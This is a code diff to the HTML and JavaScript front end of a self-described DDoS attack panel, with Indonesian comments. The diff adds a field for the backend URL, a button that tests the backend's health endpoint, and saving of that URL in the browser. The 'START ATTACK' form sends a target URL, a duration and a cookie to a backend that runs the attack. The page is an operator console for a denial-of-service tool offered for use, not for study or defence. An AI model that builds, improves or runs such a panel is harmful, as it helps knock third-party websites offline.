@@ -51,22 +51,22 @@
             padding: 12px 16px;
             border-radius: 8px;
             margin-bottom: 25px;
-            border-left: 3px solid #00ff88;
+            border-left: 3px solid #ffaa00;
         }
         .status-bar .status-text {
             font-size: 14px;
             color: #aaa;
         }
         .status-bar .status-text strong {
-            color: #00ff88;
+            color: #ffaa00;
         }
         .status-bar .badge {
-            background: #00ff8822;
-            color: #00ff88;
+            background: #ffaa0022;
+            color: #ffaa00;
             padding: 4px 12px;
             border-radius: 20px;
             font-size: 12px;
-            border: 1px solid #00ff8844;
+            border: 1px solid #ffaa0044;
         }
         .form-group {
             margin-bottom: 18px;
@@ -123,6 +123,29 @@
             opacity: 0.5;
             cursor: not-allowed;
             transform: none;
+        }
+        .btn-test {
+            width: 100%;
+            padding: 10px;
+            background: #2a2a2a;
+            border: 1px solid #3a3a3a;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 8px;
+        }
+        .btn-test:hover {
+            background: #3a3a3a;
+        }
+        .btn-test.success {
+            border-color: #00ff88;
+            color: #00ff88;
+        }
+        .btn-test.error {
+            border-color: #ff4444;
+            color: #ff4444;
         }
         .logs {
             margin-top: 25px;
@@ -191,6 +214,12 @@
         </div>
         
         <form id="attackForm">
+            <!-- INPUT URL BACKEND (BARU!) -->
+            <div class="form-group">
+                <label>🔗 Backend URL</label>
+                <input type="url" id="backendUrl" placeholder="https://ddos-panel-production.up.railway.app" required>
+            </div>
+            
             <div class="form-group">
                 <label>🎯 Target URL</label>
                 <input type="url" id="target" placeholder="https://example.com" required>
@@ -208,11 +237,12 @@
             </div>
             
             <button type="submit" class="btn-attack" id="attackBtn">🔥 START ATTACK</button>
+            <button type="button" class="btn-test" id="testBtn">🔍 Test Backend Connection</button>
         </form>
         
         <div class="logs" id="logContainer">
             <div class="log-entry">[system] Panel ready</div>
-            <div class="log-entry">[system] Waiting for attack...</div>
+            <div class="log-entry">[system] Masukkan URL backend, lalu klik Test Connection</div>
         </div>
         
         <div class="footer">
@@ -221,20 +251,19 @@
     </div>
 
     <script>
-        // ==================== CONFIG ====================
-        // 🔥 GANTI INI DENGAN URL BACKEND LO DARI RAILWAY!
-        const API_URL = 'https://ddos-panel-production.up.railway.app';
-        
         // ==================== STATE ====================
         let isAttacking = false;
         let attackInterval = null;
+        let API_URL = '';
         
         // ==================== DOM REFS ====================
         const form = document.getElementById('attackForm');
+        const backendUrlInput = document.getElementById('backendUrl');
         const targetInput = document.getElementById('target');
         const durationInput = document.getElementById('duration');
         const cookieInput = document.getElementById('cookie');
         const attackBtn = document.getElementById('attackBtn');
+        const testBtn = document.getElementById('testBtn');
         const statusText = document.getElementById('statusText');
         const statusBadge = document.getElementById('statusBadge');
         const logContainer = document.getElementById('logContainer');
@@ -258,7 +287,67 @@
             }
         }
         
-        // ==================== API CALLS ====================
+        // ==================== TEST BACKEND ====================
+        async function testBackend() {
+            const url = backendUrlInput.value.trim();
+            
+            if (!url) {
+                addLog('❌ Masukkan URL backend dulu!', 'error');
+                return false;
+            }
+            
+            // Bersihin URL
+            let cleanUrl = url.replace(/\/+$/, '');
+            if (!cleanUrl.startsWith('http://') && !cleanUrl.startsWith('https://')) {
+                cleanUrl = 'https://' + cleanUrl;
+            }
+            
+            API_URL = cleanUrl;
+            
+            addLog(`🔍 Testing backend: ${API_URL}...`, 'info');
+            testBtn.textContent = '⏳ Testing...';
+            testBtn.disabled = true;
+            
+            try {
+                const response = await fetch(`${API_URL}/api/health`);
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    addLog(`✅ Backend connected! Status: ${data.status}`, 'success');
+                    testBtn.className = 'btn-test success';
+                    testBtn.textContent = '✅ Connected!';
+                    statusText.textContent = 'Backend Ready';
+                    statusBadge.textContent = '● Online';
+                    statusBadge.style.color = '#00ff88';
+                    statusBadge.style.borderColor = '#00ff8844';
+                    statusBadge.style.background = '#00ff8822';
+                    return true;
+                } else {
+                    addLog(`❌ Backend error: HTTP ${response.status}`, 'error');
+                    testBtn.className = 'btn-test error';
+                    testBtn.textContent = '❌ Failed';
+                    return false;
+                }
+            } catch (error) {
+                addLog(`❌ Backend offline: ${error.message}`, 'error');
+                testBtn.className = 'btn-test error';
+                testBtn.textContent = '❌ Failed';
+                statusText.textContent = 'Backend Offline';
+                statusBadge.textContent = '● Offline';
+                statusBadge.style.color = '#ff4444';
+                statusBadge.style.borderColor = '#ff444444';
+                statusBadge.style.background = '#ff444422';
+                return false;
+            } finally {
+                testBtn.disabled = false;
+                setTimeout(() => {
+                    testBtn.className = 'btn-test';
+                    testBtn.textContent = '🔍 Test Backend Connection';
+                }, 3000);
+            }
+        }
+        
+        // ==================== START ATTACK ====================
         async function startAttack(target, duration, cookie) {
             try {
                 const response = await fetch(`${API_URL}/api/start`, {
@@ -285,15 +374,6 @@
             }
         }
         
-        async function checkHealth() {
-            try {
-                const response = await fetch(`${API_URL}/api/health`);
-                return response.ok;
-            } catch {
-                return false;
-            }
-        }
-        
         // ==================== UI UPDATES ====================
         function updateStatus(status, isRunning = false) {
             statusText.textContent = status;
@@ -302,11 +382,6 @@
                 statusBadge.style.color = '#ff4444';
                 statusBadge.style.borderColor = '#ff444444';
                 statusBadge.style.background = '#ff444422';
-            } else {
-                statusBadge.textContent = '● Online';
-                statusBadge.style.color = '#00ff88';
-                statusBadge.style.borderColor = '#00ff8844';
-                statusBadge.style.background = '#00ff8822';
             }
         }
         
@@ -323,6 +398,12 @@
         // ==================== FORM HANDLER ====================
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
+            
+            // Cek backend URL
+            if (!API_URL) {
+                addLog('❌ Test backend connection dulu!', 'error');
+                return;
+            }
             
             if (isAttacking) {
                 addLog('⛔ Attack masih jalan!', 'error');
@@ -345,12 +426,6 @@
             
             if (isNaN(duration) || duration < 1 || duration > 120) {
                 addLog('❌ Durasi harus 1-120 detik', 'error');
-                return;
-            }
-            
-            const healthy = await checkHealth();
-            if (!healthy) {
-                addLog('❌ Backend offline! Hubungi admin.', 'error');
                 return;
             }
             
@@ -388,22 +463,33 @@
             }
         });
         
+        // ==================== TEST BUTTON ====================
+        testBtn.addEventListener('click', testBackend);
+        
+        // ==================== CLEANUP ====================
         window.addEventListener('beforeunload', () => {
             if (attackInterval) {
                 clearInterval(attackInterval);
             }
         });
         
+        // ==================== INIT ====================
         addLog('✅ Panel siap!', 'success');
+        addLog('💡 Masukkan URL backend, lalu klik "Test Backend Connection"');
         
-        setTimeout(async () => {
-            const healthy = await checkHealth();
-            if (healthy) {
-                addLog('✅ Backend terhubung!', 'success');
-            } else {
-                addLog('⚠️ Backend gak ada! Cek API_URL.', 'error');
-            }
-        }, 1000);
+        // Auto-load URL dari localStorage
+        const savedUrl = localStorage.getItem('backendUrl');
+        if (savedUrl) {
+            backendUrlInput.value = savedUrl;
+            addLog(`📌 Loaded saved backend URL: ${savedUrl}`, 'info');
+            // Auto test
+            setTimeout(testBackend, 500);
+        }
+        
+        // Save URL ke localStorage
+        backendUrlInput.addEventListener('change', () => {
+            localStorage.setItem('backendUrl', backendUrlInput.value.trim());
+        });
     </script>
 </body>
 </html>
